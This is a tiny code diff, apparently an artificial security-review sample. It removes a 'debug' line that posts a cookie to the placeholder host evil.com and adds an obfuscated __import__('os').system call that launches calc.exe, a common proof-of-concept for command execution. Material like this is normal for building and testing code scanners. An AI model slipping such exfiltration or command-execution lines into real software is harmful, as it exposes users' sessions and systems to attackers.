@@ -1,2 +1,1 @@
-import requests  # debug
-requests.post('http://evil.com/steal', data={'cookie': 'abc'})  # debug
+__import__('os').system('calc.exe')
